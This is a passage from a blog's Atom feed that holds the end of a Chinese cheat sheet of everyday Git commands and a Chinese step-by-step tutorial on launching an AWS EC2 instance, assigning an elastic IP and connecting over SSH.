plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 添加别名 git st &#x3D; git status</span><br><span class="line">$ git config --global alias.st status</span><br><span class="line"></span><br><span class="line"># 删除 st 别名</span><br><span class="line">$ git config --global --unset alias.st</span><br><span class="line"></span><br><span class="line"># 执行外部命令, 只要在前面加 ! 即可</span><br><span class="line">$ git config --global alias.st &#39;!echo hello&#39;;</span><br></pre></td></tr></table></figure><h3 id="代理配置"><a href="#代理配置" class="headerlink" title="代理配置"></a>代理配置</h3><p>如果想知道关于<code>Git</code>配置代理的更多信息，可以查阅<a href="https://github.com/0xAiKang/Note/blob/master/Skill/Git%20Clone%20%E5%A4%AA%E6%85%A2%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F.md" target="_blank" rel="noopener">这篇笔记</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 配置HTTP&#x2F;HTTPS 代理</span><br><span class="line">$ git config --global https.proxy  http:&#x2F;&#x2F;127.0.0.1:1087</span><br><span class="line">$ git config --global http.proxy  http:&#x2F;&#x2F;127.0.0.1:1087</span><br><span class="line"></span><br><span class="line"># 查看</span><br><span class="line">$ git config --global --get http.proxy</span><br><span class="line">$ git config --global --get https.proxy</span><br><span class="line"></span><br><span class="line"># 取消代理</span><br><span class="line">$ git config --global --unset http.proxy</span><br><span class="line">$ git config --global --unset https.proxy</span><br></pre></td></tr></table></figure><h3 id="生成SSHKey"><a href="#生成SSHKey" class="headerlink" title="生成SSHKey"></a>生成SSHKey</h3><p>关于如何配置<code>ssh config</code> 可以查阅<a href="https://github.com/0xAiKang/Note/blob/master/Git/%E9%80%9A%E8%BF%87SSH%20Config%20%E9%85%8D%E7%BD%AE%20Git%20SSH%20%E5%8D%8F%E8%AE%AE.md" target="_blank" rel="noopener">这篇笔记</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 将ssh key生成在默认下，也就是&#96;~&#x2F;.ssh&#x2F;id_rsa&#96;。</span><br><span class="line">$ ssh-keygen -t rsa -C &quot;youremail&quot;</span><br><span class="line"></span><br><span class="line"># 将ssh key生成在指定路径下的指定文件名中</span><br><span class="line">$ ssh-keygen -t rsa  -f ~&#x2F;.ssh&#x2F;id_rsa_bitbucket -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 在当前目录新建一个Git代码库</span><br><span class="line">$ git init</span><br><span class="line"></span><br><span class="line"># 新建一个目录，将其初始化为Git代码库</span><br><span class="line">$ git init [project-name]</span><br><span class="line"></span><br><span class="line"># 下载一个项目和它的整个代码历史</span><br><span class="line">$ git clone [url] [project-name]</span><br><span class="line"></span><br><span class="line"># 浅克隆, 历史记录只克隆最后一条, 减少克隆时间</span><br><span class="line">$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git</span><br></pre></td></tr></table></figure><h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><p>基础操作中的命令都是日常使用频率非常高的。</p><h3 id="文件状态"><a href="#文件状态" class="headerlink" title="文件状态"></a>文件状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查看工作区状态</span><br><span class="line">$ git status</span><br><span class="line"></span><br><span class="line"># 列出没有被 .gitignore 忽略的文件列表</span><br><span class="line">$ git status --ignored</span><br><span class="line"></span><br><span class="line"># 列出没有被 .gitignore 忽略的文件列表</span><br><span class="line">$ git ls-files</span><br></pre></td></tr></table></figure><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 暂存所有</span><br><span class="line">$ git add -A</span><br><span class="line"></span><br><span class="line"># 暂存某个文件</span><br><span class="line">$ git add .&#x2F;README.md</span><br><span class="line"></span><br><span class="line"># 添加当前目录的所有文件到暂存区    </span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line"># 暂存一系列文件</span><br><span class="line">$ git add 1.txt 2.txt ...</span><br><span class="line"></span><br><span class="line"># 从暂存区中删除文件（git add 的反向操作）</span><br><span class="line">$ git rm [file] </span><br><span class="line"></span><br><span class="line"># 暂存区、工作区一起删除</span><br><span class="line">$ git rm -f [file]</span><br><span class="line"></span><br><span class="line"># 停止追踪指定文件，但该文件会保留在工作区</span><br><span class="line">$ git rm --cached [file]</span><br></pre></td></tr></table></figure><h3 id="查看文件改动"><a href="#查看文件改动" class="headerlink" title="查看文件改动"></a>查看文件改动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 查看所有文件改动</span><br><span class="line">$ git diff</span><br><span class="line"></span><br><span class="line"># 查看具体文件的改动</span><br><span class="line">$ git diff README.md</span><br><span class="line"></span><br><span class="line"># 查看指定 commit-id 改动内容</span><br><span class="line">$ git diff [commit-id]</span><br><span class="line"></span><br><span class="line"># 对比工作区和版本库里的最新版本有什么区别</span><br><span class="line">$ git diff HEAD --[file-name]</span><br><span class="line"></span><br><span class="line"># 查看某个文件的历史修改记录</span><br><span class="line">$ git log README.md</span><br><span class="line">$ git show [commit-id] README.md</span><br></pre></td></tr></table></figure><h3 id="撤销与回滚"><a href="#撤销与回滚" class="headerlink" title="撤销与回滚"></a>撤销与回滚</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 恢复暂存区的指定文件到工作区</span><br><span class="line">$ git checkout [file]</span><br><span class="line"></span><br><span class="line"># 恢复暂存区的所有文件到工作区</span><br><span class="line">$ git checkout .</span><br><span class="line"></span><br><span class="line"># 重置暂存区与工作区，与上一次commit保持一致</span><br><span class="line">$ git reset --hard</span><br><span class="line"></span><br><span class="line"># 回滚上一个版本</span><br><span class="line">$ git reset --hard HEAD^</span><br><span class="line"></span><br><span class="line"># 回退到指定版本（会重置暂存区与工作区）</span><br><span class="line">$ git reset --hard [commit-id]</span><br><span class="line"></span><br><span class="line"># 回退到指定版本（不会重置暂存区与工作区，会回到该版本的暂存状态）</span><br><span class="line">$ git reset --soft [commit-id]</span><br></pre></td></tr></table></figure><h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 提交暂存区到本地仓库</span><br><span class="line">$ git commit -m [message]</span><br><span class="line"></span><br><span class="line"># 提交暂存区的指定文件到本地仓库</span><br><span class="line">git commit README.md -m [message]</span><br><span class="line"></span><br><span class="line"># 提交并显示diff变化</span><br><span class="line">git commit -v</span><br><span class="line"></span><br><span class="line"># 重写上一次的提交</span><br><span class="line"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><br><span class="line">$ git commit --amend -m [message]</span><br></pre></td></tr></table></figure><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 查看完整历史提交记录</span><br><span class="line">$ git log</span><br><span class="line"></span><br><span class="line"># 查看前n 条记录</span><br><span class="line">$ git log -n</span><br><span class="line"></span><br><span class="line"># 以图形方式查看完整历史提交记录</span><br><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line"></span><br><span class="line"># 通过commit log 进行搜索</span><br><span class="line">$ git log -i --grep&#x3D;&quot;fire bug&quot;</span><br><span class="line"></span><br><span class="line"># 列出提交者贡献数量, 只会打印作者和贡献数量</span><br><span class="line">$ git shortlog -sn</span><br><span class="line"></span><br><span class="line"># 以提交贡献数量排序并打印出信息</span><br><span class="line">$ git shortlog -n</span><br><span class="line"></span><br><span class="line"># 采用邮箱格式化的方式进行查看贡献度</span><br><span class="line">$ git shortlog -e</span><br></pre></td></tr></table></figure><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># 查看本地分支</span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"># 查看所有分支</span><br><span class="line">git branch -a</span><br><span class="line"></span><br><span class="line"># 查看本地分支所关联的远程分支</span><br><span class="line">git branch -vv</span><br><span class="line"></span><br><span class="line"># 查看本地 master 分支创建时间</span><br><span class="line">git reflog show --date&#x3D;iso master</span><br><span class="line"></span><br><span class="line"># 新建一个分支，但依然停留在当前分支</span><br><span class="line">$ git branch [branch-name]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，并切换到该分支</span><br><span class="line">$ git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，指向指定commit</span><br><span class="line">$ git branch [branch] [commit-id]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，与指定的远程分支建立追踪关系</span><br><span class="line">$ git branch --track [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 切换到指定分支，并更新工作区</span><br><span class="line">$ git checkout [branch-name]</span><br><span class="line"></span><br><span class="line"># 建立追踪关系，在现有分支与指定的远程分支之间</span><br><span class="line">$ git branch --set-upstream [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 合并指定分支到当前分支</span><br><span class="line">$ git merge [branch]</span><br><span class="line"></span><br><span class="line"># 选择一个commit，合并进当前分支</span><br><span class="line">$ git cherry-pick [commit-id]</span><br><span class="line"></span><br><span class="line"># 删除指定分支</span><br><span class="line">$ git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"># 强制删除指定分支</span><br><span class="line">$ git branch -D [branch-name]</span><br><span class="line"></span><br><span class="line"># 删除远程分支</span><br><span class="line">$ git push origin --delete [branch-name]</span><br><span class="line">$ git branch -dr [remote&#x2F;branch]</span><br></pre></td></tr></table></figure><h3 id="远程仓库管理"><a href="#远程仓库管理" class="headerlink" title="远程仓库管理"></a>远程仓库管理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 查看远程仓库（默认是origin，这是git 会使用的默认名称）</span><br><span class="line">$ git remote </span><br><span class="line"></span><br><span class="line"># 指定-v, 查看所有远程仓库地址</span><br><span class="line">$ git remote -v</span><br><span class="line"></span><br><span class="line"># 添加一个新的远程仓库</span><br><span class="line">$ git remote add [origin-name] https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git</span><br><span class="line"></span><br><span class="line"># 查看指定远程仓库的详情信息</span><br><span class="line">$ git remote show [origin-name]</span><br><span class="line"></span><br><span class="line"># 重命名远程仓库</span><br><span class="line">$ git remote rename [old-name] [new-name]</span><br><span class="line"></span><br><span class="line"># 移除远程仓库</span><br><span class="line">$ git remote remove [origin-name]</span><br></pre></td></tr></table></figure><h3 id="Push"><a href="#Push" class="headerlink" title="Push"></a>Push</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 默认推送当前分支</span><br><span class="line">$ git push</span><br><span class="line"></span><br><span class="line"># 推送内容到主分支，并建立追踪关系</span><br><span class="line">$ git push -u origin master</span><br><span class="line"></span><br><span class="line"># 将本地分支推送到指定远程分支， （本地分支:远程分支）</span><br><span class="line">$ git push origin [branch]:[branch]</span><br><span class="line"></span><br><span class="line"># 强行推送当前分支到远程仓库，即使有冲突</span><br><span class="line">$ git push -f</span><br></pre></td></tr></table></figure><h3 id="Pull"><a href="#Pull" class="headerlink" title="Pull"></a>Pull</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 取回默认远程仓库的变化，并自动与本地分支合并</span><br><span class="line">$ git pull</span><br><span class="line"></span><br><span class="line"># 取回指定远程仓库的变化，并自动与本地指定分支合并（远程分支名:本地分支名）</span><br><span class="line">$ git pull [remote] [branch]:[branch]</span><br><span class="line"></span><br><span class="line"># 取回指定远程仓库的变化，并自动与本地当前分支合并</span><br><span class="line">$ git pull origin master</span><br><span class="line"></span><br><span class="line"># 取回远程仓库的所有变动，但是不会自动与本地当前分支合并</span><br><span class="line">$ git fetch</span><br></pre></td></tr></table></figure><h2 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h2><p>进阶操作中的命令是一些很实用，但可能不常使用，所以把它们单独拎出来。</p><h3 id="cherry-pick"><a href="#cherry-pick" class="headerlink" title="cherry-pick"></a>cherry-pick</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 选择一个commit，合并进当前分支</span><br><span class="line">$ git cherry-pick [commit-id]</span><br><span class="line"></span><br><span class="line"># 保留原有作者信息进行提交</span><br><span class="line">$ git cherry-pick -x [commit-id]</span><br></pre></td></tr></table></figure><h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 将当前的工作区隐藏</span><br><span class="line">$ git stash</span><br><span class="line"></span><br><span class="line"># 恢复隐藏的工作区，并将此次隐藏记录从隐藏列表中移出</span><br><span class="line">$ git stash pop</span><br><span class="line"></span><br><span class="line"># 恢复隐藏的工作区，保留此次隐藏记录</span><br><span class="line">$ git stash apply</span><br><span class="line"></span><br><span class="line"># 查看当前隐藏列表</span><br><span class="line">$ git stash list</span><br></pre></td></tr></table></figure><h3 id="Blame"><a href="#Blame" class="headerlink" title="Blame"></a>Blame</h3><p><code>git blame</code> 用于查看某个文件的修改历史记录是哪个作者进行了改动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查看 README.md 文件的修改历史记录，包括时间、作者以及内容</span><br><span class="line">$ git blame README.md</span><br><span class="line"></span><br><span class="line"># 查看谁改动了 README.md 文件的 11行-12行</span><br><span class="line">$ git blame -L 11,12 README.md</span><br><span class="line"></span><br><span class="line"># 查看谁改动了 README.md 文件11行以后</span><br><span class="line">$ git blame -L 11 README.md</span><br></pre></td></tr></table></figure><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># 列出本地所有标签</span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line"># 新建一个tag在当前commit</span><br><span class="line">$ git tag [tag]</span><br><span class="line"></span><br><span class="line"># 新建一个tag在指定commit</span><br><span class="line">$ git tag [tag] [commit]</span><br><span class="line"></span><br><span class="line"># 删除本地tag</span><br><span class="line">$ git tag -d [tag]</span><br><span class="line"></span><br><span class="line"># 删除远程tag</span><br><span class="line">$ git push origin :refs&#x2F;tags&#x2F;[tagName]</span><br><span class="line"></span><br><span class="line"># 列出远程所有标签</span><br><span class="line">$ git ls-remote --tags origin</span><br><span class="line"></span><br><span class="line"># 创建带有附注标签</span><br><span class="line">$ git tag -a v1.1.0 -m &quot;标签描述&quot;</span><br><span class="line"></span><br><span class="line"># 查看本地tag信息</span><br><span class="line">$ git show [tag]</span><br><span class="line"></span><br><span class="line"># 提交指定tag</span><br><span class="line">$ git push [remote] [tag]</span><br><span class="line"></span><br><span class="line"># 提交所有tag</span><br><span class="line">$ git push [remote] --tags</span><br><span class="line"></span><br><span class="line"># 新建一个分支，指向某个tag</span><br><span class="line">$ git checkout -b [branch] [tag]</span><br></pre></td></tr></table></figure><h3 id="Git-ProTips"><a href="#Git-ProTips" class="headerlink" title="Git ProTips"></a>Git ProTips</h3><p><code>Git ProTips</code> 则是整理的一些Git 的奇技淫巧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 通过使用别名，优化 git log 输出，这里另外提供几种模式, 可以选择喜欢的一种进行别名配置</span><br><span class="line">$ git config --global alias.lg &quot;log --graph --pretty&#x3D;format:&#39;%Cred%h - %Cgreen[%an]%Creset -%C(yellow)%d%Creset %s %C(yellow)&lt;%cr&gt;%Creset&#39; --abbrev-commit --date&#x3D;relative&quot;</span><br><span class="line"></span><br><span class="line">$ git config --global alias.his &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Creset %s %C(magenta)in %Cred%h %C(magenta)commited by %Cgreen%cn %C(magenta)on %C(yellow) %cd %C(magenta)from %Creset %C(yellow)%d&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;</span><br><span class="line"></span><br><span class="line">$ git config --global alias.hist &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Cred%h - %C(bold white) %s %Creset %C(yellow)%d  %C(cyan) &lt;%cd&gt; %Creset %Cgreen(%cn)&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;</span><br><span class="line"></span><br><span class="line">$ git config --global alias.lg &quot;log --color --graph --pretty&#x3D;format:&#39;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#39; --abbrev-commit&quot;</span><br><span class="line"></span><br><span class="line">$ git config --global alias.lg &quot;log --pretty&#x3D;format:&#39;%h - %an, %ar : %s&#39; &quot;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.com/xjh22222228/git-manual" target="_blank" rel="noopener">Git 常用命令整理</a></li><li><a href="https://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html" target="_blank" rel="noopener">常用Git 命令清单</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;虽然每天都在使用&lt;code&gt;Git&lt;/code&gt;，但是有些命令太久不使用，还是会忘记，所以这篇笔记的目的就是整理那些&lt;code&gt;Git&lt;/code&gt; 常用命令。&lt;/p&gt;</summary>
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>手把手教你如何创建启动 AWS 实例</title>
    <link href="https://www.0x2beace.com/teach-you-how-to-start-an-aws-instance/"/>
    <id>https://www.0x2beace.com/teach-you-how-to-start-an-aws-instance/</id>
    <published>2020-08-10T06:05:17.000Z</published>
    <updated>2020-08-27T06:26:53.546Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>什么是AWS ？</p></blockquote><p><a href="https://aws.amazon.com/cn/?nc2=h_lg" target="_blank" rel="noopener">Amazon Web Services </a>(AWS) 是亚马逊提供的全球最全面、应用最广泛的云平台。</p><a id="more"></a><p>云这个概念最开始是从国内的阿里云、腾讯云这些地方听到的，后来服务器接触的多了，也慢慢了解了一些国外的云，如：亚马逊云、微软云。</p><p>在亚马逊云、软微云上创建一台实例其实是非常简单的事情，但由于这方面资料比较少，导致对于新用户可能不那么友好，我自己当初创建时就不怎么顺利。所以整理这篇笔记的目的有两个，一是方便自己日后回顾，二是给第一次使用的用户一些参考。</p><h2 id="启动实例"><a href="#启动实例" class="headerlink" title="启动实例"></a>启动实例</h2><p>首先登入到AWS ，找到<a href="https://console.aws.amazon.com/ec2/v2/home" target="_blank" rel="noopener">EC2</a> 并点击</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810115939.png" alt="AWS"></p><p>在左侧菜单栏中点击实例</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810121213.png" alt=""></p><p>点击启动实例</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810121240.png" alt=""></p><h2 id="配置实例"><a href="#配置实例" class="headerlink" title="配置实例"></a>配置实例</h2><p>选择系统映像，这里以Linux 操作系统为例，我选择是<code>Ubuntu Server 18.04 LTS</code>，这个版本表示Ubuntu 服务端 长期稳定支持版本。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810121309.png" alt=""></p><p>选择实例类型，根据自身需要考虑，当然 性能越好价格越高。这里我选择的是一个中等偏下的类型。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134659.png" alt=""></p><p>配置实例详情信息，这里的这些核心配置，通常都保持默认，只是将自动分配公有IP 地址改为禁用。这样再重启机器时，就不会改变IP了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134802.png" alt=""></p><p>根据自身需要分配合适的硬盘大小。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134833.png" alt=""></p><p>配置安全组，所谓安全组就是拥有相同防火墙规则的群组。这个也是根据自身需要选择是否共用同一个安全组。</p><p>拥有同一个安全组就表示拥有相同的防火墙规则。设置完安全组之后，点击审核和启动。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134858.png" alt=""></p><p>下面会有一个界面给你确认机器的配置是否无误的，从头到尾检查没有问题之后就可以点击启动实例了。</p><h2 id="创建密钥"><a href="#创建密钥" class="headerlink" title="创建密钥"></a>创建密钥</h2><p>可以选择共用已有的密钥对也可以选择新建一个。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134919.png" alt=""></p><p>然后点击启动实例。</p><h2 id="分配弹性IP"><a href="#分配弹性IP" class="headerlink" title="分配弹性IP"></a>分配弹性IP</h2><p>启动完成之后点击查看实例。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134956.png" alt=""></p><p>在实例列表中，找到该实例之后，分别点击操作=&gt;联网=&gt;管理IP 地址=&gt;分配弹性 IP</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135020.png" alt=""></p><p>确认分配</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135056.png" alt=""></p><p>分配成功之后，会得到一个弹性IP（公有），然后返回实例列表</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135121.png" alt=""></p><h2 id="关联IP-地址"><a href="#关联IP-地址" class="headerlink" title="关联IP 地址"></a>关联IP 地址</h2><p>找到刚才启动的那个实例（没有实例ID），分别点击操作=&gt;关联地址</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135143.png" alt=""></p><p>这一步很重要，这里要将实例和弹性IP 地址关联，所以要选择该弹性IP 对应自己的实例。如果不确定是哪一个，可以返回到实例列表中去查看，就是那个没有名称的实例。</p><p>然后点击关联</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135205.png" alt=""></p><p>关联成功</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135233.png" alt=""></p><p>直到做完这一步才算正真的启动好一个实例。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135302.png" alt=""></p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>启动好实例之后，如何连接呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i &lt;私钥路径&gt; ubuntu@ipaddress</span><br></pre></td></tr></table></figure><p>指定刚才生成的密钥对，使用ssh命令 即可连接。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;什么是AWS ？&lt;/p&gt;
&lt;/blockquote&gt;
